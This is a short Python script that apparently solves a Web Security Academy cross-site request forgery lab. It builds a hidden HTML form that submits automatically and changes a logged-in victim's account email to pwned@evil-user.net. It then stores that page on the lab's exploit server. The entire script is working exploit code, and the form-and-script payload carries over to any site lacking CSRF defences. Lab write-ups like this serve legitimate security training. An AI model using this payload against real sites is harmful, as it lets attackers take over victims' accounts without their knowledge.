import requests
from bs4 import BeautifulSoup

site = 'acff1ff01ebcf22fc0608a280097005b.web-security-academy.net'

s = requests.Session()

change_url = f'https://{site}/my-account'
resp = s.get(change_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html = f'''
<html>
  <body>
        <form action="https://{site}/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="pwned@evil-user.net">
        </form>
        <script>
          document.forms[0].submit();
        </script>
  </body>
</html>'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.get(exploit_url, data=formData)
soup = BeautifulSoup(resp.text,'html.parser')
print(soup)

